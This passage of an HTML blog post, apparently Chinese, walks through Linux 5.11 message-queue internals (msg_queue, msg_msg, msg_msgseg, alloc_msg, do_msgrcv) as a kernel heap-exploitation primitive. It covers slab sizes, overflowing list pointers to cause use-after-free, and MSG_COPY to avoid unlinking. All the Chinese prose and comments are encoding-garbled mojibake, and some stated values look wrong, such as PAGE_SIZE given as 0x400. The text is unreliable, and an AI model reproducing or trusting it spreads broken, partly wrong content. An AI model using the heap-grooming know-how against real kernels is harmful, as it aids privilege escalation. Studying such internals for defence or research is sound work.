INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¸‹é¢ä¸€å †çœ‹ä¸æ‡‚åœ¨å¹²å•¥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//è¿™äº›ä¸ºä¸€äº›ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­˜æ”¾msg_msgç›¸å…³æŒ‡é’ˆnextã€prev,æ¯”è¾ƒé‡è¦,é€šå¸¸æ‹¿æ¥æº¢å‡ºåˆ¶é€ UAF</span></span><br><span class="line">    <span class="comment">//å’Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„æ‰€æœ‰æ¶ˆæ¯ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>æ¥ç€å½“ä½¿ç”¨<code>msgsnd</code>å‡½æ•°ä¼ é€’æ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºæ–°çš„<code>msg_msg</code>ç»“æ„ä½“ï¼Œæ¶ˆæ¯è¿‡é•¿çš„è¯å°±ä¼šåˆ›å»ºæ›´å¤šçš„<code>msg_msgseg</code>æ¥å­˜å‚¨æ›´å¤šçš„æ¶ˆæ¯ã€‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨åœ¨<code>alloc_msg()</code>å‡½æ•°</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æœ€å¤§å‘é€DATALEN_MSGé•¿åº¦çš„æ¶ˆæ¯</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„PAGE_SIZEä¸º0x400,å³æœ€å¤škmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//ä½¿ç”¨æ­£å¸¸</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¦‚æœä¼ å…¥æ¶ˆæ¯é•¿åº¦è¶…è¿‡0x400-0x30,å°±å†è¿›è¡Œç”³è¯·msg_msgsegã€‚</span></span><br><span class="line">    <span class="comment">//ä½¿ç”¨kmallocç”³è¯·,æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNTã€‚</span></span><br><span class="line">    <span class="comment">//æœ€å¤§ä¹Ÿä¸º0x400,ä¹Ÿå±äºkmalloc-1024</span></span><br><span class="line">    <span class="comment">//è¿˜æœ‰å†é•¿çš„æ¶ˆæ¯,å°±å†ç”³è¯·msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//ä¸çŸ¥é“å¹²å•¥çš„</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//ç”³è¯·å®Œä¹‹å,å°†msg_msgsegæ”¾åˆ°msg-&gt;nextè¿™ä¸ªå•å‘é“¾è¡¨ä¸Š</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¤´éƒ¨å¤§å°<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>ç»“æ„å¦‚ä¸‹ï¼Œåªæ˜¯ä¸€ä¸ª<code>struct msg_msgseg*</code>æŒ‡é’ˆ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="ç›¸å…³å†…å­˜ç»“æ„ï¼š"   >
          <a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="headerlink" title="ç›¸å…³å†…å­˜ç»“æ„ï¼š"></a>ç›¸å…³å†…å­˜ç»“æ„ï¼š</h6>
      <p>åœ¨ä¸€ä¸ª<code>msg_queue</code>é˜Ÿåˆ—ä¸‹ï¼Œæ¶ˆæ¯é•¿åº¦ä¸º<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>ä¸€æ¡æ¶ˆæ¯ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>ä¸¤æ¡æ¶ˆæ¯ï¼š</p>
<p>ä»¥<code>msg_queue</code>çš„<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="æœªå‘½åæ–‡ä»¶"></p>
</li>
</ul>
<p>åŒç†ï¼ŒåŒä¸€ä¸ª<code>msg_queue</code>æ¶ˆæ¯é˜Ÿåˆ—ä¸‹çš„å¤šæ¡æ¶ˆæ¯ä¹Ÿæ˜¯ç±»ä¼¼çš„</p>

        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li>ä½¿ç”¨<code>msgget()</code>å‡½æ•°åˆ›å»ºå†…æ ¸ç©ºé—´çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„<code>msg_msgseg</code>ï¼Œè¿”å›å€¼ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„<code>id</code>æ ‡å¿—<code>queue_id</code><ul>
<li><code>msg_msgseg</code>ç®¡ç†æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤§å°ä¸º0x100ï¼Œ<code>kmalloc-256</code>ã€‚</li>
<li>å…¶<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</li>
</ul>
</li>
<li>æ¯æ¬¡åœ¨è¯¥æ¶ˆæ¯é˜Ÿåˆ—<code>queue_id</code>ä¸‹è°ƒç”¨<code>msgsnd()</code>å‡½æ•°éƒ½ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msg</code>ç»“æ„ï¼Œæ¶ˆæ¯é•¿åº¦å¤§äº<code>0x400-0x30</code>å°±ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„<ul>
<li><code>msg_msg</code>ä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼Œä¸<code>msg_queue</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸<code>msg_msgseg</code>å½¢æˆå•å‘é“¾è¡¨å¤§å°æœ€å¤§ä¸º0x400ï¼Œå±äº<code>kmalloc-64</code>è‡³<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>ä¹Ÿä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼ŒæŒ‚åœ¨<code>msg_msg</code>å•å‘é“¾è¡¨ä¸­ï¼Œå¤§å°æœ€å¤§ä¸º<code>0x400</code>ï¼Œå±äº<code>kmalloc-16</code>è‡³<code>kmalloc-1024</code>ï¼Œå½“æ¶ˆæ¯é•¿åº¦å¾ˆé•¿æ—¶å°±ä¼šç”³è¯·å¾ˆå¤šçš„å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„ã€‚</li>
</ul>
</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶-1"   >
          <a href="#B-æ•°æ®å¤åˆ¶-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶-1" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>è°ƒç”¨å®Œ<code>alloc_msg()</code>å‡½æ•°åï¼Œå›åˆ°<code>load_msg()</code>å‡½æ•°æ¥ç€è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå‡½æ•°è¿˜æ˜¯æŒºç®€å•çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…ˆå¤åˆ¶è¿›msg_msgä¸­å­˜æ”¾æ¶ˆæ¯çš„éƒ¨åˆ†</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//éå†msg_msgä¸‹çš„msg_msgseg,é€ä¸ªå­˜æ”¾æ•°æ®è¿›å»</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-4"   >
          <a href="#â‘¡é‡Šæ”¾-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-4" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>é¦–å…ˆå…³æ³¨ä¸€ä¸‹<code>do_msgrcv()</code>å‡½æ•°ï¼Œé‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ¯”è¾ƒé‡è¦</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå‡†å¤‡ä¸€ä¸ªmsg_msgçš„å‰¯æœ¬copy,é€šå¸¸ç”¨æ¥é˜²æ­¢unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//ä»è¿™é‡Œå¯ä»¥çœ‹å‡º,åŒæ ·ä¹Ÿéœ€è¦è®¾ç½®IPC_NOWAITæ ‡å¿—ä½æ‰ä¸ä¼šå‡ºé”™</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//è¿™ä¸ªprepare_copy()å‡½æ•°å†…éƒ¨è°ƒç”¨äº†load_msg()å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//ä¼ å…¥çš„sizeå‚æ•°ä¸ºbufsz,å°±ç”¨æˆ·ç©ºé—´å®é™…éœ€è¦æ¶ˆæ¯çš„é•¿åº¦,é‚£ä¹ˆç”³è¯·çš„å †å—é•¿åº¦å°±å¯å˜äº†</span></span><br><span class="line">        <span class="comment">//ä¸ä¸€å®šæ˜¯è¿™æ¡æ¶ˆæ¯çš„é•¿åº¦,è€Œæ˜¯ç”±æˆ‘ä»¬ç›´æ¥æ§åˆ¶,è™½ç„¶æœ€åä¹Ÿä¼šé‡Šæ”¾æ‰</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™æ ·å°±ä¸ä¼šå°†msg_msgä»msg_queueæ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿›è¡ŒUnlinkæ‘˜é™¤</span></span><br><span class="line">    <span class="comment">//åªæ˜¯é‡Šæ”¾å †å—,åœ¨åç»­çš„ä»£ç ä¸­æœ‰æ˜¾ç¤º</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//å¼€å§‹ä»msg_queueä¸­å¯»æ‰¾åˆé€‚çš„msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//æœ€å¥½è®¾ç½®MSG_NOERRORæ ‡å¿—ä½,è¿™æ ·è¯·æ±‚è·å–æ¶ˆæ¯é•¿åº¦å°äºm_tsç¨‹åºä¹Ÿä¸ä¼šé€€å‡ºäº†</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//è®¾ç½®äº†MSG_COPYæ 